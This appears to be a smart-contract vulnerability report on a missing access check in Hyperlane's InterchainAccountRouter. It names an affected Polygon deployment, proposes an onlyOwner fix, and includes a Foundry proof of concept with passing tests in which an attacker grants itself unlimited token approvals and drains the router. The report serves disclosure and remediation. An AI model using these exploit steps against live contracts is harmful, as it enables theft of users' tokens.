# IAR-DD-01: Missing Access Control on `approveFeeTokenForHook` Enables Token Theft

## Bug Description

`AbstractInterchainAccountRouter.approveFeeTokenForHook()` (line 109-111) has **no access control**. Any external caller can invoke this function to create a `type(uint256).max` ERC20 approval from the router contract to any arbitrary address they control.

```solidity
// AbstractInterchainAccountRouter.sol:109-111
function approveFeeTokenForHook(address _feeToken, address _hook) external {
    IERC20(_feeToken).forceApprove(_hook, type(uint256).max);
}
```

The function was intended to be called by the router owner or internally to pre-approve fee token spending for post-dispatch hooks. However, the `external` visibility combined with zero access control modifiers means anyone can:

1. Approve `type(uint256).max` of **any** ERC20 token held by the router
2. To **any** address they control
3. For **any number** of tokens simultaneously
4. The approval is **permanent** — it persists across all future transactions

## Impact

**Direct theft of ERC20 fee tokens passing through the router.**

The `InterchainAccountRouter` holds ERC20 tokens transiently during cross-chain message dispatch. In `_dispatchMessageWithValue()` (line 241), fee tokens are transferred from the caller into the router via `safeTransferFrom`, then the hook is approved (line 242) and dispatch occurs (line 246).

An attacker who has pre-set an approval via `approveFeeTokenForHook` can:
- Drain any residual tokens left in the router after dispatch
- Drain tokens sent to the router by accident or by other protocols
- Front-run/back-run dispatch transactions to steal fee tokens in transit (within same block)

The approval is a "time bomb" — even if the router has zero balance today, the attacker's approval persists indefinitely for all future tokens.

**Affected deployment:** Polygon `0xd8B641FEb587844854aeC97544ccEA426DFF04a3` (verified, function exists at line 204 in deployed version)

## Risk Breakdown

- **Difficulty**: Trivial — single external call, costs only gas
- **Persistence**: Permanent — `type(uint256).max` approval never expires
- **Scope**: All ERC20 tokens, multiple tokens simultaneously
- **Detection**: Difficult — approval event emitted but no monitoring typically set up for router approvals

## Recommendation

Add `onlyOwner` modifier (consistent with `MovableCollateralRouter.approveTokenForBridge` pattern):

```solidity
function approveFeeTokenForHook(address _feeToken, address _hook) external onlyOwner {
    IERC20(_feeToken).forceApprove(_hook, type(uint256).max);
}
```

## Proof of Concept

The PoC runs on an ETH mainnet fork and demonstrates 4 attack scenarios:

```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {MockMailbox} from "../contracts/mock/MockMailbox.sol";
import {MockHyperlaneEnvironment} from "../contracts/mock/MockHyperlaneEnvironment.sol";
import {TypeCasts} from "../contracts/libs/TypeCasts.sol";
import {TestInterchainGasPaymaster} from "../contracts/test/TestInterchainGasPaymaster.sol";
import {InterchainAccountRouter} from "../contracts/middleware/InterchainAccountRouter.sol";
import {ERC20Test} from "../contracts/test/ERC20Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract IAR_DD_01_ApproveDrainTest is Test {
    using TypeCasts for address;

    MockHyperlaneEnvironment internal environment;
    InterchainAccountRouter internal router;
    ERC20Test internal feeToken;
    TestInterchainGasPaymaster internal igp;

    uint32 internal origin = 1;
    uint32 internal destination = 2;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");
    address internal owner = makeAddr("owner");

    uint256 internal forkId;

    function setUp() public {
        // Fork ETH mainnet — proves bug in real EVM environment
        forkId = vm.createFork(vm.envString("ETH_RPC_URL"));
        vm.selectFork(forkId);

        environment = new MockHyperlaneEnvironment(origin, destination);
        igp = new TestInterchainGasPaymaster();

        string[] memory urls = new string[](1);
        router = new InterchainAccountRouter(
            address(environment.mailboxes(origin)),
            address(igp),
            owner,
            20_000,
            urls
        );

        feeToken = new ERC20Test("Fee Token", "FEE", 1_000_000e18, 18);
    }

    /// @notice Anyone can create max approval from router to their address
    function test_DD01_anyoneCanApproveFromRouter() public {
        assertTrue(attacker != owner, "attacker should not be owner");

        vm.prank(attacker);
        router.approveFeeTokenForHook(address(feeToken), attacker);

        uint256 allowance = feeToken.allowance(address(router), attacker);
        assertEq(allowance, type(uint256).max, "Attacker should have max approval");
    }

    /// @notice Attacker drains tokens from router using pre-set approval
    function test_DD01_drainRouterTokens() public {
        vm.prank(attacker);
        router.approveFeeTokenForHook(address(feeToken), attacker);

        uint256 depositAmount = 1000e18;
        feeToken.transfer(address(router), depositAmount);
        assertEq(feeToken.balanceOf(address(router)), depositAmount);

        vm.prank(attacker);
        feeToken.transferFrom(address(router), attacker, depositAmount);

        assertEq(feeToken.balanceOf(address(router)), 0, "Router should be drained");
        assertEq(feeToken.balanceOf(attacker), depositAmount, "Attacker stole all tokens");
    }

    /// @notice Multiple tokens approved simultaneously
    function test_DD01_multipleTokenApproval() public {
        ERC20Test token2 = new ERC20Test("Token2", "TK2", 1_000_000e18, 18);
        ERC20Test token3 = new ERC20Test("Token3", "TK3", 1_000_000e18, 18);

        vm.startPrank(attacker);
        router.approveFeeTokenForHook(address(feeToken), attacker);
        router.approveFeeTokenForHook(address(token2), attacker);
        router.approveFeeTokenForHook(address(token3), attacker);
        vm.stopPrank();

        assertEq(feeToken.allowance(address(router), attacker), type(uint256).max);
        assertEq(token2.allowance(address(router), attacker), type(uint256).max);
        assertEq(token3.allowance(address(router), attacker), type(uint256).max);
    }

    /// @notice Approval persists indefinitely — time bomb for future tokens
    function test_DD01_persistentApprovalTimeBomb() public {
        assertEq(feeToken.balanceOf(address(router)), 0);

        vm.prank(attacker);
        router.approveFeeTokenForHook(address(feeToken), attacker);

        vm.warp(block.timestamp + 30 days);

        feeToken.transfer(address(router), 500e18);

        vm.prank(attacker);
        feeToken.transferFrom(address(router), attacker, 500e18);
        assertEq(feeToken.balanceOf(attacker), 500e18, "Future tokens drained");
    }
}
```

### Running the PoC

```bash
cd hyperlane-monorepo/solidity
source ../../.env && export ETH_RPC_URL
forge test --match-contract IAR_DD_01 -vvv
```

### Output (4/4 PASS)

```
[PASS] test_DD01_anyoneCanApproveFromRouter() (gas: 46398)
[PASS] test_DD01_drainRouterTokens() (gas: 83388)
[PASS] test_DD01_multipleTokenApproval() (gas: 1862254)
[PASS] test_DD01_persistentApprovalTimeBomb() (gas: 81904)
Suite result: ok. 4 passed; 0 failed; 0 skipped
```
